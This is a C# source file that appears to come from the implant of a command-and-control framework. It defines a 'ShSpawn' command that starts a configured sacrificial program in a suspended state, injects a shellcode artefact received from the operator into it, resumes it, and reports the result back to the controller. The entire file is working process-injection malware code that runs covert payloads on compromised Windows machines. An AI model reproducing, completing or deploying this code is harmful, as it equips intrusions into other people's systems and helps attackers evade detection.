using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class ShSpawn : DroneCommand
{
    public override byte Command => 0x18;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // get the spawn to
        var spawnTo = Drone.Config.Get<string>(Setting.SpawnTo);

        // try to spawn process
        var pa = new Win32.SECURITY_ATTRIBUTES();
        var ta = new Win32.SECURITY_ATTRIBUTES();
        
        var si = new Win32.STARTUPINFOEX();
        si.StartupInfo.cb = (uint)Marshal.SizeOf(si);

        if (!Win32.CreateProcess(
                spawnTo,
                null,
                ref pa,
                ref ta,
                false,
                Win32.PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                Directory.GetCurrentDirectory(),
                ref si,
                out var pi))
            throw new Win32Exception(Marshal.GetLastWin32Error());

        var injector = new Injector(task.Artefact);

        if (injector.InjectAndResume(pi))
        {
            await Drone.SendTaskComplete(task);
            return;
        }

        await Drone.SendError(task, $"Failed to inject into PID {pi.dwProcessId}.");
        
        // kill spawned process
        using var process = Process.GetProcessById(pi.dwProcessId);
        
        if (!process.HasExited)
            process.Kill();
    }
}